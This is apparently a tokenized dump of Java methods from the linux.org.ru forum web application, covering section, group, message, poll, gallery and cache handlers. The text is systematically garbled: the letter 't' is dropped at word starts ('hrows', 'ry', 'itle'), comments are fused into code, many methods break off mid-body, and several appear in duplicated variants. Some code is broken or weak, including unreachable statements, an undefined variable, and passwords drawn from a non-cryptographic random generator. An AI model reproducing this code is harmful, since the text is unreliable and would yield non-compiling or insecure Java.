public Group getGroup ( Connection db , String name ) hrows SQLException , BadGroupException { PreparedStatement st = db . prepareStatement ( " SELECT id FROM groups WHERE section=? AND urlname=? " ) ; st . setInt ( 1 , id ) ; st . setString ( 2 , name ) ; ResultSet rs = st . executeQuery ( ) ; if ( ! rs . next ( ) ) { hrow new BadGroupException ( " group not found " ) ; } return new Group ( db , rs . getInt ( 1 ) ) ; } 
public ModelAndView modifyGroup ( @RequestParam ( " group " ) int id , @RequestParam ( " info " ) String info , @RequestParam ( " urlName " ) String urlName , @RequestParam ( " longinfo " ) String longInfo , @RequestParam ( value = " preview " , required = false ) String preview , @RequestParam ( value = " resolvable " , required = false ) String resolvable , ServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } Connection db = null ; ry { db = dataSource . getConnection ( ) ; 
public ModelAndView galleryGroup ( @RequestParam ( required = false ) Integer offset , @PathVariable ( " group " ) String groupName , HttpServletResponse response ) hrows Exception { Connection db = null ; Group group ; ry { db = LorDataSource . getConnection ( ) ; Section section = new Section ( db , Section . SECTION_GALLERY ) ; group = section . getGroup ( db , groupName ) ; } finally { if ( db ! = null ) { db . close ( ) ; } } ModelAndView mv = showNews ( null , null , Section . SECTION_GALLERY , group . getId ( ) , null , offset , response ) ; mv . getModel ( ) . put ( " url " , " /gallery/ " + groupName + " / " ) ; mv . getModel ( ) . put ( " params " , null ) ; return mv ; } 
public ModelAndView getMessageNew ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " page " , required = false ) Integer page , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) hrows Exception { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public static int getSection ( String name ) hrows SectionNotFoundException { Integer v = sections . get ( name ) ; if ( v = = null ) { hrow new SectionNotFoundException ( ) ; } return v ; } 
public ModelAndView getMessageNewForum ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " page " , required = false ) Integer page , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) hrows Exception { return getMessageNew ( Section . SECTION_FORUM , webRequest , request , response , page , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNewNews ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " page " , required = false ) Integer page , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) hrows Exception { return getMessageNew ( Section . SECTION_NEWS , webRequest , request , response , page , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNewPolls ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " page " , required = false ) Integer page , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) hrows Exception { return getMessageNew ( Section . SECTION_POLLS , webRequest , request , response , page , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNewGallery ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " page " , required = false ) Integer page , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) hrows Exception { return getMessageNew ( Section . SECTION_GALLERY , webRequest , request , response , page , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNew ( int section , WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , Integer page , String filter , String groupName , int msgid ) hrows Exception { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView archiveList ( int sectionid ) hrows Exception { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView newsArchive ( ) hrows Exception { return archiveList ( Section . SECTION_NEWS ) ; } 
public ModelAndView pollsArchive ( ) hrows Exception { return archiveList ( Section . SECTION_POLLS ) ; } 
public View galleryArchiveOld ( @RequestParam ( " section " ) int id ) hrows Exception { return new RedirectView ( Section . getArchiveLink ( id ) ) ; } 
public ModelAndView polls ( @RequestParam ( required = false ) Integer offset , HttpServletResponse response ) hrows Exception { ModelAndView mv = showNews ( null , null , Section . SECTION_POLLS , null , null , offset , response ) ; mv . getModel ( ) . put ( " url " , " /polls/ " ) ; mv . getModel ( ) . put ( " params " , null ) ; return mv ; } 
public ModelAndView news ( @RequestParam ( required = false ) Integer offset , HttpServletResponse response ) hrows Exception { ModelAndView mv = showNews ( null , null , Section . SECTION_NEWS , null , null , offset , response ) ; mv . getModel ( ) . put ( " url " , " /news/ " ) ; mv . getModel ( ) . put ( " params " , null ) ; return mv ; } 
public View galleryOldLink ( @RequestParam int section , @RequestParam ( required = false ) Integer offset , @RequestParam ( value = " month " , required = false ) Integer month , @RequestParam ( value = " year " , required = false ) Integer year ) { if ( offset ! = null ) { return new RedirectView ( Section . getSectionLink ( section ) + " ?offset= " + Integer . oString ( offset ) ) ; } if ( year ! = null ) { return new RedirectView ( Section . getArchiveLink ( section ) + Integer . oString ( year ) + " / " + Integer . oString ( month ) ) ; } return new RedirectView ( Section . getSectionLink ( section ) ) ; } 
public ModelAndView galleryArchive ( @PathVariable String section , @PathVariable int year , @PathVariable int month , HttpServletResponse response ) hrows Exception { ModelAndView mv = showNews ( month , year , Section . getSection ( section ) , null , null , null , response ) ; mv . getModel ( ) . put ( " url " , " /gallery/archive/ " + year + " / " + month + " / " ) ; mv . getModel ( ) . put ( " params " , null ) ; return mv ; } 
public ModelAndView forum ( @RequestParam ( required = false ) Integer offset , HttpServletResponse response ) hrows Exception { ModelAndView mv = showNews ( null , null , Section . SECTION_FORUM , null , null , offset , response ) ; mv . getModel ( ) . put ( " url " , " /forum/lenta " ) ; mv . getModel ( ) . put ( " params " , null ) ; return mv ; } 
public View galleryOldLink ( @RequestParam int section , @RequestParam ( required = false ) Integer offset , @RequestParam ( value = " month " , required = false ) Integer month , @RequestParam ( value = " year " , required = false ) Integer year ) { if ( offset ! = null ) { return new RedirectView ( Section . getNewsViewerLink ( section ) + " ?offset= " + Integer . oString ( offset ) ) ; } if ( year ! = null ) { return new RedirectView ( Section . getArchiveLink ( section ) + Integer . oString ( year ) + " / " + Integer . oString ( month ) ) ; } return new RedirectView ( Section . getNewsViewerLink ( section ) ) ; } 
public ModelAndView galleryGroup ( @RequestParam ( required = false ) Integer offset , @PathVariable ( " group " ) String groupName , HttpServletResponse response ) hrows Exception { return group ( Section . SECTION_GALLERY , offset , groupName , response ) ; } 
public ModelAndView newsGroup ( @RequestParam ( required = false ) Integer offset , @PathVariable ( " group " ) String groupName , HttpServletResponse response ) hrows Exception { return group ( Section . SECTION_NEWS , offset , groupName , response ) ; } 
public ModelAndView pollsGroup ( @RequestParam ( required = false ) Integer offset , @PathVariable ( " group " ) String groupName , HttpServletResponse response ) hrows Exception { return group ( Section . SECTION_POLLS , offset , groupName , response ) ; } 
public ModelAndView group ( int sectionId , Integer offset , String groupName , HttpServletResponse response ) hrows Exception { Connection db = null ; Group group ; ry { db = LorDataSource . getConnection ( ) ; Section section = new Section ( db , sectionId ) ; group = section . getGroup ( db , groupName ) ; } finally { if ( db ! = null ) { db . close ( ) ; } } ModelAndView mv = showNews ( null , null , group . getSectionId ( ) , group . getId ( ) , null , offset , response ) ; mv . getModel ( ) . put ( " url " , group . getUrl ( ) ) ; mv . getModel ( ) . put ( " params " , null ) ; return mv ; } 
public View galleryOldLink ( @RequestParam int section , @RequestParam ( required = false ) Integer offset , @RequestParam ( value = " month " , required = false ) Integer month , @RequestParam ( value = " year " , required = false ) Integer year , @RequestParam ( value = " group " , required = false ) Integer groupId ) hrows Exception { if ( offset ! = null ) { return new RedirectView ( Section . getNewsViewerLink ( section ) + " ?offset= " + Integer . oString ( offset ) ) ; } if ( year ! = null ) { return new RedirectView ( Section . getArchiveLink ( section ) + Integer . oString ( year ) + " / " + Integer . oString ( month ) ) ; } if ( groupId ! = null ) { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; Group group = new Group ( db , groupId ) ; return new RedirectView ( Section . getNewsViewerLink ( section ) + group . getUrlName ( ) + " / " ) ; } finally { if ( db ! = null ) { db . close ( ) ; } } } return new RedirectView ( Section . getNewsViewerLink ( section ) ) ; } 
public ModelAndView opics ( @RequestParam ( " group " ) int groupId , @RequestParam ( value = " offset " , required = false ) Integer offsetObject ) hrows Exception { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView opicsLastmod ( @RequestParam ( " group " ) int groupId , @RequestParam ( value = " offset " , required = false ) Integer offsetObject ) hrows Exception { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView forum ( @PathVariable ( " group " ) String groupName , @RequestParam ( required = false ) Integer offsetObject , @RequestParam ( defaultValue = " false " ) boolean lastmod , HttpServletRequest request ) hrows Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; Template mpl = Template . getTemplate ( request ) ; boolean showDeleted = request . getParameter ( " deleted " ) ! = null ; params . put ( " showDeleted " , showDeleted ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView forum ( @PathVariable ( " group " ) String groupName , @RequestParam ( required = false , value = " offset " ) Integer offsetObject , @RequestParam ( defaultValue = " false " ) boolean lastmod , HttpServletRequest request ) hrows Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; Template mpl = Template . getTemplate ( request ) ; boolean showDeleted = request . getParameter ( " deleted " ) ! = null ; params . put ( " showDeleted " , showDeleted ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView getMessageNewForum ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) hrows Exception { return getMessageNew ( Section . SECTION_FORUM , webRequest , request , response , null , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNewNews ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) hrows Exception { return getMessageNew ( Section . SECTION_NEWS , webRequest , request , response , null , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNewPolls ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) hrows Exception { return getMessageNew ( Section . SECTION_POLLS , webRequest , request , response , null , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNewGallery ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) hrows Exception { return getMessageNew ( Section . SECTION_GALLERY , webRequest , request , response , null , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNewForumPage ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @PathVariable ( " page " ) int page ) hrows Exception { return getMessageNew ( Section . SECTION_FORUM , webRequest , request , response , page , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNewNewsPage ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @PathVariable ( " page " ) int page ) hrows Exception { return getMessageNew ( Section . SECTION_NEWS , webRequest , request , response , page , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNewPollsPage ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @PathVariable ( " page " ) int page ) hrows Exception { return getMessageNew ( Section . SECTION_POLLS , webRequest , request , response , page , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNewGalleryPage ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @PathVariable ( " page " ) int page ) hrows Exception { return getMessageNew ( Section . SECTION_GALLERY , webRequest , request , response , page , filter , groupName , msgid ) ; } 
public ModelAndView getMessageOld ( @RequestParam ( " msgid " ) int msgid , @RequestParam ( value = " page " , required = false ) Integer page , @RequestParam ( value = " lastmod " , required = false ) Long lastmod , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( required = false ) String output ) hrows Exception { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView jumpMessage ( HttpServletRequest request , @RequestParam int msgid , @RequestParam ( required = false ) Integer page , @RequestParam ( required = false ) String nocache , @RequestParam ( required = false ) Integer cid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public TopTenMessageDTO mapRow ( ResultSet rs , int i ) hrows SQLException { TopTenMessageDTO result = new TopTenMessageDTO ( ) ; result . setUrl ( Section . getSectionLink ( rs . getInt ( " section " ) ) + rs . getString ( " urlname " ) + " / " + rs . getInt ( " msgid " ) ) ; result . setTitle ( rs . getString ( " itle " ) ) ; result . setLastmod ( rs . getTimestamp ( " lastmod " ) ) ; result . setAnswers ( rs . getInt ( " c " ) ) ; Integer savedOrder = rs . getInt ( " mess_order " ) ; if ( rs . wasNull ( ) ) { savedOrder = null ; } result . setMovedUp ( savedOrder = = null | | ( i + 1 ) > savedOrder ) ; return result ; } 
public void execute ( Object o ) { TopTenDaoImpl . TopTenMessageDTO dto = ( TopTenDaoImpl . TopTenMessageDTO ) o ; int mp = dto . getAnswers ( ) / itemsPerPage ; mp = ( dto . getAnswers ( ) % itemsPerPage > 0 ) ? mp + 1 : mp ; dto . setPages ( mp ) ; } 
private GalleryItem createGalleryItem ( ResultSet rs ) hrows SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " itle " ) ) ; item . setUrl ( rs . getString ( " url " ) ) ; item . setIcon ( rs . getString ( " linktext " ) ) ; item . setNick ( rs . getString ( " nick " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setLink ( Section . getSectionLink ( Section . SECTION_GALLERY ) + rs . getString ( " urlname " ) + " / " + rs . getInt ( " msgid " ) ) ; String htmlPath = properties . getProperty ( " HTMLPathPrefix " ) ; item . setHtmlPath ( htmlPath ) ; ry { item . setInfo ( new ImageInfo ( htmlPath + item . getIcon ( ) ) ) ; item . setImginfo ( new ImageInfo ( htmlPath + item . getUrl ( ) ) ) ; } catch ( BadImageException e ) { log . error ( e ) ; } catch ( IOException e ) { log . error ( e ) ; } return item ; } 
public ModelAndView getInfoNew ( @PathVariable String nick , HttpSession session ) hrows Exception { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public View galleryArchiveOld ( @RequestParam ( " section " ) int id , HttpServletResponse response ) hrows Exception { String link = Section . getArchiveLink ( id ) ; if ( link = = null ) { response . sendError ( 404 , " Now archive for this section " ) ; return null ; } return new RedirectView ( link ) ; } 
public void estSimpleURL ( ) { assertTrue ( URLUtil . isUrl ( " http:www.linux.org.ru/ " ) ) ; } 
public void estURL ( ) { assertTrue ( URLUtil . isUrl ( " http:www.linux.org.ru:80/dfrer.jsp?msgid=3412345 " ) ) ; } 
public void estBadURL ( ) { assertFalse ( URLUtil . isUrl ( " xttp:www.linux.org.ru/ " ) ) ; } 
public void estIPUrl ( ) { assertTrue ( URLUtil . isUrl ( " http:127.0.0.1/ " ) ) ; } 
public ModelAndView edit ( HttpServletRequest request , @RequestParam ( " msgid " ) int msgid , @RequestParam ( value = " lastEdit " , required = false ) Long lastEdit ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; HttpSession session = request . getSession ( ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Map < String , Object > params = new HashMap < String , Object > ( ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView edit ( HttpServletRequest request , @RequestParam ( " msgid " ) int msgid , @RequestParam ( value = " lastEdit " , required = false ) Long lastEdit , @RequestParam ( value = " bonus " , required = false , defaultValue = " 3 " ) int bonus ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; HttpSession session = request . getSession ( ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Map < String , Object > params = new HashMap < String , Object > ( ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public void pingFeedburner ( ) { ry { config . setServerURL ( new URL ( " http:ping.feedburner.com/ " ) ) ; 
public void changeGroup ( Connection db , int changeGroupId ) hrows SQLException { Statement st = db . createStatement ( ) ; st . executeUpdate ( " UPDATE topics SET groupid= " + changeGroupId + " WHERE id= " + msgid ) ; st . executeUpdate ( " UPDATE groups SET stat4=stat4+1 WHERE id= " + guid + " or id= " + changeGroupId ) ; st . close ( ) ; } 
public ModelAndView edit ( HttpServletRequest request , @RequestParam ( " msgid " ) int msgid , @RequestParam ( value = " lastEdit " , required = false ) Long lastEdit , @RequestParam ( value = " bonus " , required = false , defaultValue = " 3 " ) int bonus , @RequestParam ( value = " chgrp " , required = false ) Integer changeGroupId ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; HttpSession session = request . getSession ( ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Map < String , Object > params = new HashMap < String , Object > ( ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public void doFilter ( ServletRequest servletRequest , ServletResponse servletResponse , FilterChain filterChain ) hrows ServletException , IOException { if ( filterConfig = = null ) { return ; } ry { Template mpl = new Template ( ( HttpServletRequest ) servletRequest , properties , ( HttpServletResponse ) servletResponse ) ; servletRequest . setAttribute ( " emplate " , mpl ) ; } catch ( Exception ex ) { logger . fatal ( " Can't build Template " , ex ) ; return ; } filterChain . doFilter ( servletRequest , servletResponse ) ; } 
public boolean checkIP ( String addr ) hrows TextParseException { String query = invertIPAddress ( addr ) + '.' + zone ; logger . debug ( " Looking for " + query ) ; Lookup lookup = new Lookup ( query , Type . A ) ; lookup . setResolver ( resolver ) ; Record [ ] r = lookup . run ( ) ; if ( r = = null | | r . length = = 0 ) { return false ; } logger . info ( " DNSBL: found " + addr + " in DNSBL: " + r [ 0 ] ) ; TODO: check what we really got ;-) return true; } 
public static String detectImageType ( File file ) hrows BadImageException , IOException { logger . debug ( " Detecting image type for: " + file + " ( " + file . length ( ) + " bytes) " ) ; ImageInfo2 ii = new ImageInfo2 ( ) ; FileInputStream is = null ; ry { is = new FileInputStream ( file ) ; 
public static void resizeImage ( String filename , String iconname , int size ) hrows IOException , UtilException , InterruptedException { String [ ] cmd = { " /usr/bin/convert " , " -scale " , Integer . oString ( size ) , filename , iconname } ; Process proc = Runtime . getRuntime ( ) . exec ( cmd ) ; int exitStatus = proc . waitFor ( ) ; if ( exitStatus ! = 0 ) { logger . warn ( " Failed to convert from " + filename + " to " + iconname ) ; 
public ModelAndView showForm ( @RequestParam ( " msgid " ) int msgid ) hrows Exception { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView showCommitForm ( HttpServletRequest request , @RequestParam ( " msgid " ) int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView showEditForm ( HttpServletRequest request , @RequestParam ( " msgid " ) int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; HttpSession session = request . getSession ( ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
private ModelAndView prepareModel ( Connection db , Message message ) hrows SQLException , MessageNotFoundException , BadGroupException , UserNotFoundException , AccessViolationException { Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " message " , message ) ; Group group = new Group ( db , message . getGroupId ( ) ) ; params . put ( " group " , group ) ; params . put ( " groups " , Group . getGroups ( db , message . getSection ( ) ) ) ; params . put ( " newMsg " , message ) ; List < EditInfoDTO > editInfoList = message . loadEditInfo ( db ) ; if ( editInfoList ! = null ) { params . put ( " editInfo " , editInfoList . get ( 0 ) ) ; } params . put ( " commit " , false ) ; return new ModelAndView ( " edit " , params ) ; } 
public ModelAndView viewAll ( @RequestParam ( value = " section " , required = false , defaultValue = " 0 " ) int sectionId ) hrows Exception { Connection db = null ; ModelAndView modelAndView = new ModelAndView ( " view-all " ) ; ry { db = LorDataSource . getConnection ( ) ; 
public boolean remove ( Connection db , int uid ) hrows SQLException { if ( ! ignoreList . containsKey ( uid ) ) { return false ; } PreparedStatement pst = db . prepareStatement ( " DELETE FROM ignore_list WHERE userid=? AND ignored=? " ) ; pst . clearParameters ( ) ; pst . setInt ( 1 , userId ) ; pst . setInt ( 2 , uid ) ; boolean r = pst . executeUpdate ( ) = = 1 ; if ( r ) { ignoreList . remove ( uid ) ; } return r ; } 
public PollDTO getCurrentPoll ( ) hrows PollNotFoundException { String sql = " SELECT votenames.id, topics.title, votenames.topic FROM votenames " + " JOIN topics on votenames.topic = topics.id WHERE " + " topics.moderate AND not topics.deleted " + " AND topics.commitdate = (select max(commitdate) " + " from topics where groupid=19387 AND moderate AND NOT deleted) " ; PollDTO result = jdbcTemplate . queryForObject ( sql , new ParameterizedRowMapper < PollDTO > ( ) { @Override public PollDTO mapRow ( ResultSet rs , int rowNum ) hrows SQLException { PollDTO result = new PollDTO ( ) ; result . setId ( rs . getInt ( " id " ) ) ; result . setTitle ( rs . getString ( " itle " ) ) ; result . setTopic ( rs . getInt ( " opic " ) ) ; return result ; } } , new HashMap ( ) ) ; if ( result = = null ) { hrow new PollNotFoundException ( - 1 ) ; } return result ; } 
public static int createPoll ( Connection db , List < String > pollList ) hrows SQLException { int voteid = getNextPollId ( db ) ; PreparedStatement pst = db . prepareStatement ( " INSERT INTO votenames (id) values (?) " ) ; pst . setInt ( 1 , voteid ) ; pst . executeUpdate ( ) ; ry { Poll poll = new Poll ( db , voteid ) ; for ( String variant : pollList ) { if ( variant . rim ( ) . length ( ) = = 0 ) { continue ; } poll . addNewVariant ( db , variant ) ; } } catch ( PollNotFoundException ex ) { hrow new RuntimeException ( ex ) ; } return voteid ; } 
public List < User > getNewUsers ( Connection db ) hrows SQLException , UserNotFoundException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT id FROM users where regdate IS NOT null " + " AND regdate > CURRENT_TIMESTAMP - interval '3 days' ORDER BY regdate " ) ; ArrayList < User > list = new ArrayList < User > ( ) ; while ( rs . next ( ) ) { list . add ( User . getUser ( db , rs . getInt ( " id " ) ) ) ; } st . close ( ) ; return list ; } 
public ModelAndView add ( HttpServletRequest request ) hrows Exception { Connection db = null ; Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new UserErrorException ( " Not authorized " ) ; } ry { db = LorDataSource . getConnection ( ) ; 
public boolean isMobile ( ) { if (!style.equals("tango")) { return false; } return userAgent.detectAndroidWebKit(); return true; } 
public static int parseFilterChain ( String filter ) { if ( " list " . equals ( filter ) ) { return FILTER_IGNORED ; } if ( " anonymous " . equals ( filter ) ) { return FILTER_ANONYMOUS ; } return FILTER_NONE ; } 
public TopTenMessageDTO mapRow ( ResultSet rs , int i ) hrows SQLException { TopTenMessageDTO result = new TopTenMessageDTO ( ) ; result . setUrl ( Section . getSectionLink ( rs . getInt ( " section " ) ) + rs . getString ( " urlname " ) + " / " + rs . getInt ( " msgid " ) ) ; result . setTitle ( rs . getString ( " itle " ) ) ; result . setLastmod ( rs . getTimestamp ( " lastmod " ) ) ; result . setAnswers ( rs . getInt ( " c " ) ) ; return result ; } 
public boolean isUncommited ( ) { return uncommited ; } 
public ModelAndView showUserTopicsNew ( @PathVariable String nick , @RequestParam ( value = " offset " , required = false ) Integer offset , @RequestParam ( value = " output " , required = false ) String output , HttpServletResponse response ) hrows Exception { Connection db = null ; Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " url " , " /people/ " + nick + " / " ) ; params . put ( " whoisLink " , " /people/ " + nick + " / " + " profile " ) ; TODO params.put("archiveLink", "/people/"+nick+"/archive/"); try { response.setDateHeader("Expires", System.currentTimeMillis() + 60 * 1000); 
public static String getNewsViewerLink ( int section ) hrows SectionNotFoundException { switch ( section ) { case SECTION_FORUM : 
public View oldLink ( @RequestParam int section , @RequestParam ( required = false ) Integer offset , @RequestParam ( value = " month " , required = false ) Integer month , @RequestParam ( value = " year " , required = false ) Integer year , @RequestParam ( value = " group " , required = false ) Integer groupId ) hrows Exception { if ( offset ! = null ) { return new RedirectView ( Section . getNewsViewerLink ( section ) + " ?offset= " + Integer . oString ( offset ) ) ; } if ( year ! = null ) { return new RedirectView ( Section . getArchiveLink ( section ) + Integer . oString ( year ) + " / " + Integer . oString ( month ) ) ; } if ( groupId ! = null ) { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; Group group = new Group ( db , groupId ) ; return new RedirectView ( Section . getNewsViewerLink ( section ) + group . getUrlName ( ) + " / " ) ; } finally { if ( db ! = null ) { db . close ( ) ; } } } return new RedirectView ( Section . getNewsViewerLink ( section ) ) ; } 
private void createReplyTo ( Integer replyTo , Map < String , Object > params , Connection db ) hrows SQLException , MessageNotFoundException , AccessViolationException { if ( replyTo ! = null & & replyTo > 0 ) { Comment onComment = new Comment ( db , replyTo ) ; 
public ModelAndView resolve ( HttpServletRequest request , @RequestParam ( " msgid " ) int msgid , @RequestParam ( " resolve " ) String resolved ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public void resetPassword ( Connection db ) hrows SQLException { String password = StringUtil . generatePassword ( ) ; PreparedStatement st = null ; ry { st = db . prepareStatement ( " UPDATE users SET passwd=? WHERE id=? " ) ; 
public static String generatePassword ( ) { StringBuilder builder = new StringBuilder ( ) ; for ( int i = 0 ; i < 10 ; i + + ) { int r = Math . abs ( random . nextInt ( ) ) ; builder . append ( ( char ) ( 33 + r % ( 126 - 33 ) ) ) ; } return builder . oString ( ) ; } 
public ModelAndView showComments ( @RequestParam String nick , @RequestParam ( defaultValue = " 0 " ) int offset , HttpServletResponse response ) hrows Exception { ModelAndView mv = new ModelAndView ( " show-comments " ) ; int opics = 50 ; mv . getModel ( ) . put ( " opics " , opics ) ; if ( offset < 0 ) { hrow new ServletParameterException ( " offset<0!? " ) ; } mv . getModel ( ) . put ( " offset " , offset ) ; boolean firstPage = offset = = 0 ; if ( firstPage ) { response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 90 * 1000 ) ; } else { response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 60 * 60 * 1000L ) ; } mv . getModel ( ) . put ( " firstPage " , firstPage ) ; Connection db = null ; MemCachedClient mcc = MemCachedSettings . getClient ( ) ; String showCommentsId = MemCachedSettings . getId ( " show-comments?id= " + URLEncoder . encode ( nick ) + " &offset= " + offset ) ; ry { db = LorDataSource . getConnection ( ) ; 
public static String showComments ( Connection db , User user , int offset , int limit ) hrows SQLException { DateFormat dateFormat = DateFormats . createDefault ( ) ; StringBuilder out = new StringBuilder ( ) ; PreparedStatement pst = null ; ry { pst = db . prepareStatement ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title, " + " opics.id as topicid, comments.id as msgid, comments.postdate " + " FROM sections, groups, topics, comments " + " WHERE sections.id=groups.section AND groups.id=topics.groupid " + " AND comments.topic=topics.id " + " AND comments.userid=? AND NOT comments.deleted ORDER BY postdate DESC LIMIT " + limit + " OFFSET " + offset ) ; pst . setInt ( 1 , user . getId ( ) ) ; ResultSet rs = pst . executeQuery ( ) ; while ( rs . next ( ) ) { out . append ( " <tr><td> " ) . append ( rs . getString ( " ptitle " ) ) . append ( " </td> " ) ; out . append ( " <td> " ) . append ( rs . getString ( " gtitle " ) ) . append ( " </td> " ) ; out . append ( " <td><a href= \" jump-message.jsp?msgid= " ) . append ( rs . getInt ( " opicid " ) ) . append ( " &amp;cid= " ) . append ( rs . getInt ( " msgid " ) ) . append ( " \" rev=contents> " ) . append ( StringUtil . makeTitle ( rs . getString ( " itle " ) ) ) . append ( " </a></td> " ) ; out . append ( " <td> " ) . append ( dateFormat . format ( rs . getTimestamp ( " postdate " ) ) ) . append ( " </td></tr> " ) ; } rs . close ( ) ; } finally { if ( pst ! = null ) { pst . close ( ) ; } } return out . oString ( ) ; } 
Object getFromCache ( String key ) ; < T > boolean storeToCache ( String key , T value , int expire ) ; < T > boolean storeToCache ( String key , T value ) ; } 
< T > boolean storeToCache ( String key , T value , int expire ) ; < T > boolean storeToCache ( String key , T value ) ; } 
public < T > boolean storeToCache ( String key , T value , int expire ) { String s = MemCachedSettings . getId ( key ) ; return MemCachedSettings . getClient ( ) . set ( s , value , expire ) ; } 
public < T > boolean storeToCache ( String key , T value ) { String s = MemCachedSettings . getId ( key ) ; return MemCachedSettings . getClient ( ) . set ( s , value , 0 ) ; } 
